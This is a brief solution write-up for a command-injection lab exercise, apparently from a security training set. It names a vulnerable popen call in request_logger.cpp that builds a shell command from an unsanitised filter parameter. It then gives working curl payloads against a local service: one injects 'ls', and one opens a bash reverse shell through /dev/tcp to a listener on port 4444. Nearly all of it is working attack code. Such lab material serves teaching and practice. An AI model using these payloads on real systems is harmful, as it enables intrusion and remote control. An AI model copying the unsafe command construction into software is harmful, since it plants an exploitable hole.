# Solution — 02 · Command Injection

**Code**: `request_logger.cpp` → `popen("sh -c \"grep " + decoded_filter + " ...")`

```bash
# Inject 'ls'
curl "http://127.0.0.1:8081/logs?filter=%3B%20ls"

# Reverse shell (listener on 4444)
curl "http://127.0.0.1:8081/logs?filter=%3B%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F4444%200%3E%261"
```
